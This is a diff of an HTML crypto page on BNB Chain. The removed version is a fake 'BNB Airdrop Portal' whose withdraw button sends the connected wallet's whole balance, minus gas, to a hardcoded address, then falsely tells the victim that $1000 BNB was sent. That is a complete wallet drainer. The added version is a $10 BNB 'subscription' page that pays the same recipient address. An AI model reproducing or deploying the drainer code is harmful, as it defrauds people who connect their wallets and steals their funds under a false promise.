@@ -1,108 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BNB Airdrop Portal</title>
-
-  <!-- Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet" />
-
-  <!-- WalletConnect Web3Modal V3 -->
-  <script src="https://unpkg.com/@walletconnect/web3modal@3.0.2/dist/browser.umd.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Subscribe with BNB</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-
+  <script src="https://unpkg.com/@walletconnect/web3modal@3.0.2/dist/browser.umd.js"></script>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background: radial-gradient(ellipse at center, #121212 0%, #000000 100%);
-      font-family: 'Orbitron', sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0f0f0f;
       color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-
     .container {
-      background: rgba(255, 255, 255, 0.06);
+      background-color: #1c1c1c;
+      padding: 40px;
       border-radius: 20px;
-      box-shadow: 0 8px 30px rgba(0, 255, 204, 0.2);
-      backdrop-filter: blur(12px);
-      padding: 40px 30px;
+      box-shadow: 0 0 20px rgba(0,255,200,0.3);
       text-align: center;
-      width: 90%;
-      max-width: 400px;
     }
-
-    h1 {
-      font-size: 2rem;
-      color: #00ffcc;
-      margin-bottom: 30px;
-      animation: pulse 2.5s ease-in-out infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { text-shadow: 0 0 10px #00ffcc; }
-      50% { text-shadow: 0 0 30px #00ffcc; }
-    }
-
     button {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      background: linear-gradient(135deg, #00ffcc, #00bfa6);
+      background-color: #00ffc3;
       color: #000;
-      transition: all 0.3s ease;
+      padding: 14px 28px;
+      margin: 12px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
     }
-
-    button:hover {
-      background: linear-gradient(135deg, #00e6b8, #009f91);
-      transform: translateY(-2px);
-      box-shadow: 0 0 12px #00ffcc;
-    }
-
-    .status {
-      margin-top: 20px;
-      font-size: 0.85rem;
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
       color: #ccc;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-    <h1>BNB Airdrop Portal</h1>
-    <button onclick="connect()">Connect Wallet</button>
-    <button onclick="sendFullBalance()">Withdraw $1000 BNB coins</button>
-    <div class="status" id="status">Wallet not connected</div>
+    <h2>Subscribe for $10 in BNB</h2>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="subscribeBtn">Subscribe</button>
+    <div id="status">Not connected</div>
   </div>
 
   <script>
     const { Web3Modal } = window.Web3Modal;
-    const { EthereumProvider } = window.WalletConnect;
     const ethers = window.ethers;
-
-    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
-    const statusEl = document.getElementById("status");
-
-    let provider, signer;
+    let signer;
+    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
+    const projectId = "81f700474cd5b9fb7fea7e00c2b821be"; // your WalletConnect project ID
 
     const modal = new Web3Modal({
-      projectId: "YOUR_PROJECT_ID", // Replace this
+      projectId,
       walletConnectVersion: 2,
-      themeMode: "dark",
+      themeMode: 'dark',
       chains: [
         {
           chainId: 56,
-          name: "BNB Chain",
-          rpc: "https://bsc-dataseed.binance.org",
+          name: "BNB Smart Chain",
+          rpc: "https://bsc-dataseed.binance.org/",
           nativeCurrency: {
             name: "BNB",
             symbol: "BNB",
@@ -113,46 +76,46 @@
       ]
     });
 
-    async function connect() {
-      const instance = await modal.connect();
-      provider = new ethers.BrowserProvider(instance);
-      signer = await provider.getSigner();
-      const address = await signer.getAddress();
-      statusEl.textContent = "Connected: " + address;
-    }
-
-    async function sendFullBalance() {
-      if (!signer) {
-        alert("Connect your wallet first.");
-        return;
-      }
-
-      const address = await signer.getAddress();
-      const balance = await provider.getBalance(address);
-      const gasPrice = await provider.getFeeData().then(data => data.gasPrice);
-      const gasLimit = 21000n;
-      const gasCost = gasPrice * gasLimit;
-      const amountToSend = balance - gasCost;
-
-      if (amountToSend <= 0n) {
-        alert("Insufficient balance for gas.");
-        return;
-      }
-
+    async function connectWallet() {
       try {
-        const tx = await signer.sendTransaction({
-          to: recipient,
-          value: amountToSend,
-          gasLimit,
-          gasPrice
-        });
-        await tx.wait();
-        alert("$1000 BNB sent successfully!");
-      } catch (err) {
-        console.error(err);
-        alert("Transaction failed.");
+        const instance = await modal.connect();
+        const provider = new ethers.BrowserProvider(instance);
+        signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        document.getElementById("status").innerText = `Connected: ${address}`;
+      } catch (error) {
+        console.error(error);
+        document.getElementById("status").innerText = "Connection failed.";
       }
     }
+
+    async function subscribe() {
+      if (!signer) {
+        alert("Please connect your wallet first.");
+        return;
+      }
+      try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
+        const data = await res.json();
+        const bnbPrice = data.binancecoin.usd;
+        const bnbAmount = (10 / bnbPrice).toFixed(6);
+
+        const tx = await signer.sendTransaction({
+          to: recipientAddress,
+          value: ethers.parseUnits(bnbAmount.toString(), "ether")
+        });
+
+        document.getElementById("status").innerText = "Transaction sent... waiting for confirmation";
+        await tx.wait();
+        document.getElementById("status").innerText = "Subscription successful!";
+      } catch (error) {
+        console.error(error);
+        document.getElementById("status").innerText = "Transaction failed.";
+      }
+    }
+
+    document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    document.getElementById("subscribeBtn").addEventListener("click", subscribe);
   </script>
 </body>
 </html>
